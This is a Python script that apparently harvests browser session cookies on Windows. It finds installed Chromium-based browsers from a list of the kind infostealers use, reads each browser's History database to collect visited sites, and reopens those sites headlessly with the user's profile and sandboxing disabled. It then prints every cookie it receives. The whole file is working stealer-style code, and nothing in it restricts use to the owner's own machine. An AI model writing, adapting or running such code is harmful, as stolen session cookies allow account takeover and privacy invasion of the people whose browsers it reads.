import os
import sqlite3
import shutil
from pathlib import Path
from urllib.parse import urlparse
import ipaddress
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
import psutil

ExcludedHosts = {
    "localhost", "127.0.0.1", "::1", "0.0.0.0", "10.0.0.0", "100.64.0.0", "127.0.0.0",
    "169.254.0.0", "172.16.0.0", "192.0.0.0", "192.0.2.0", "192.88.99.0", "192.168.0.0",
    "198.18.0.0", "198.51.100.0", "203.0.113.0", "224.0.0.0", "240.0.0.0", "255.255.255.255",
    "::", "100::", "2001::", "2001:db8::", "fc00::", "fe80::", "ff00::"
}

def FindBrowserPaths(): # NOT ALL TESTED
    Env = {"LOCALAPPDATA": os.environ["LOCALAPPDATA"], "APPDATA": os.environ["APPDATA"]}
    Browsers = {
        "OPERA": (r"%LOCALAPPDATA%\Programs\Opera\launcher.exe", ["APPDATA", "Opera Software", "Opera Stable"]),
        "OPERA_GX": (r"%LOCALAPPDATA%\Programs\Opera GX\launcher.exe", ["APPDATA", "Opera Software", "Opera GX Stable"]),
        "AMIGO": (r"%LOCALAPPDATA%\Amigo\Application\amigo.exe", ["LOCALAPPDATA", "Amigo", "User Data"]),
        "TORCH": (r"%LOCALAPPDATA%\Torch\Application\torch.exe", ["LOCALAPPDATA", "Torch", "User Data"]),
        "KOMETA": (r"%LOCALAPPDATA%\Kometa\Application\kometa.exe", ["LOCALAPPDATA", "Kometa", "User Data"]),
        "ORBITUM": (r"%LOCALAPPDATA%\Orbitum\Application\orbitum.exe", ["LOCALAPPDATA", "Orbitum", "User Data"]),
        "CENTBROWSER": (r"%LOCALAPPDATA%\CentBrowser\Application\centbrowser.exe", ["LOCALAPPDATA", "CentBrowser", "User Data"]),
        "7STAR": (r"%LOCALAPPDATA%\7Star\7Star.exe", ["LOCALAPPDATA", "7Star", "User Data"]),
        "SPUTNIK": (r"%LOCALAPPDATA%\Sputnik\Sputnik.exe", ["LOCALAPPDATA", "Sputnik", "User Data"]),
        "VIVALDI": (r"%LOCALAPPDATA%\Vivaldi\Application\vivaldi.exe", ["LOCALAPPDATA", "Vivaldi", "User Data"]),
        "CHROME_SXS": (r"C:\Program Files (x86)\Google\Chrome SxS\Application\chrome.exe", ["LOCALAPPDATA", "Google", "Chrome SxS", "User Data"]),
        "CHROME": (r"C:\Program Files\Google\Chrome\Application\chrome.exe", ["LOCALAPPDATA", "Google", "Chrome", "User Data"]),
        "EPIC_PRIVACY_BROWSER": (r"%LOCALAPPDATA%\Epic Privacy Browser\Application\epic.exe", ["LOCALAPPDATA", "Epic Privacy Browser", "User Data"]),
        "MICROSOFT_EDGE": (r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", ["LOCALAPPDATA", "Microsoft", "Edge", "User Data"]),
        "URAN": (r"%LOCALAPPDATA%\Uran\Application\uran.exe", ["LOCALAPPDATA", "Uran", "User Data"]),
        "YANDEX": (r"%LOCALAPPDATA%\Yandex\YandexBrowser\Application\browser.exe", ["LOCALAPPDATA", "Yandex", "YandexBrowser", "User Data"]),
        "BRAVE": (r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe", ["LOCALAPPDATA", "BraveSoftware", "Brave-Browser", "User Data"]), # TESTED WORKING
        "IRIDIUM": (r"C:\Program Files\Iridium\iridium.exe", ["LOCALAPPDATA", "Iridium", "User Data"]),
    }

    Installed = {}
    for Name, (ExeTemplate, UserDataParts) in Browsers.items():
        ExePath = os.path.expandvars(ExeTemplate)
        if not os.path.isfile(ExePath):
            continue
        UserDataDir = os.path.join(os.environ[UserDataParts[0]], *UserDataParts[1:])
        if not os.path.isdir(UserDataDir):
            continue
        Installed[Name] = {"EXE_PATH": ExePath, "USER_DATA_DIR": UserDataDir}

    return Installed

def IsBrowserRunning(ExePath): # Browsers (may) use a profile lock etc.., so I prefer not to handle that and just not run if the browser is open
    ExeName = os.path.basename(ExePath).lower()
    for Proc in psutil.process_iter(['name']):
        try:
            if Proc.info['name'] and Proc.info['name'].lower() == ExeName:
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

def IsValidHost(Host): 
    try:
        Ip = ipaddress.ip_address(Host)
        return not Ip.is_loopback
    except:
        return bool(Host) and '.' in Host and ',' not in Host and '*' not in Host

def GetCleanUrls(HistoryPath: Path):
    TempHistory = Path("History_temp")
    shutil.copy2(HistoryPath, TempHistory)
    Conn = sqlite3.connect(TempHistory)
    Cursor = Conn.cursor()
    Cursor.execute("SELECT url FROM urls")
    Urls = set()
    for (RawUrl,) in Cursor.fetchall():
        if RawUrl.startswith(("http://", "https://")):
            Parsed = urlparse(RawUrl)
            Host = Parsed.hostname
            if Host and Host not in ExcludedHosts and IsValidHost(Host):
                Urls.add(f"{Parsed.scheme}://{Parsed.netloc}/")
    Conn.close()
    TempHistory.unlink()
    return sorted(Urls)

def IsAuthProtected(Url):
    try:
        R = requests.get(Url, timeout=3, allow_redirects=True)
        return R.status_code == 401 and 'www-authenticate' in R.headers
    except:
        return False

def FilterUrlsConcurrently(Urls): # Filter URLs since Selenium stops on websites that have a WWW-Authenticate
    from sys import stdout
    from concurrent.futures import ThreadPoolExecutor, as_completed

    Filtered = []
    Total = len(Urls)
    Completed = 0
    print(f"Filtering {Total} URLs...")

    with ThreadPoolExecutor(max_workers=55) as Executor:
        Futures = {Executor.submit(IsAuthProtected, Url): Url for Url in Urls}
        try:
            for Future in as_completed(Futures):
                Url = Futures[Future]
                Completed += 1
                progress = int((Completed / Total) * 40)
                bar = "[" + "#" * progress + "-" * (40 - progress) + "]"
                stdout.write(f"\r{bar} {Completed}/{Total} URLs checked")
                stdout.flush()

                try:
                    Result = Future.result()
                    if not Result:
                        Filtered.append(Url)
                    else:
                        print(f"\nSKIPPED AUTH-PROTECTED: {Url}")
                except Exception as E:
                    print(f"\nSKIPPED FAILED CHECK: {Url} ({E})")

        except KeyboardInterrupt:
            print("\n[KeyboardInterrupt] Cancelling URL filtering...")
            for future in Futures:
                if not future.done():
                    future.cancel()
    print(f"\nCompleted. {len(Filtered)} URLs remain after filtering.")
    return Filtered

def CreateDriver(ExePath, UserDataDir):
    OptionsObj = Options()
    OptionsObj.binary_location = ExePath
    OptionsObj.add_argument(f"--user-data-dir={UserDataDir}")
    OptionsObj.add_argument("--profile-directory=Default")
    OptionsObj.add_argument("--no-sandbox")
    OptionsObj.add_argument("--disable-dev-shm-usage")
    OptionsObj.add_argument("--headless=new")
    OptionsObj.page_load_strategy = "eager"

    return webdriver.Chrome(options=OptionsObj)


def Main():
    Browsers = FindBrowserPaths()
    try:
        for Name, Paths in Browsers.items():
            print(f"--- browser: {Name} ---")

            if IsBrowserRunning(Paths["EXE_PATH"]):
                print(f"SKIPPED {Name} - PROCESS IN USE")
                continue

            HistoryPath = Path(Paths["USER_DATA_DIR"]) / "Default" / "History"
            if not HistoryPath.exists():
                print(f"History file not found for {Name}: {HistoryPath}")
                continue

            Urls = GetCleanUrls(HistoryPath)
            Urls = FilterUrlsConcurrently(Urls)
            Driver = CreateDriver(Paths["EXE_PATH"], Paths["USER_DATA_DIR"])
            Wait = WebDriverWait(Driver, 5)

            try:
                for Url in Urls:
                    try:
                        Driver.get(Url)
                        Wait.until(lambda d: d.execute_script("return document.readyState") == "complete")
                        Cookies = Driver.get_cookies()
                        print(f"Cookies for {Url}")
                        for Cookie in Cookies:
                            print(Cookie)
                        print("-" * 40)
                    except Exception:
                        print(f"FAILED: {Url}")
            except KeyboardInterrupt:
                print("\n[KeyboardInterrupt] Quitting driver...")
            finally:
                Driver.quit()

            print("Finally Completed...")
    except KeyboardInterrupt:
        print("\n[KeyboardInterrupt] Exiting.")

if __name__ == "__main__":
    Main()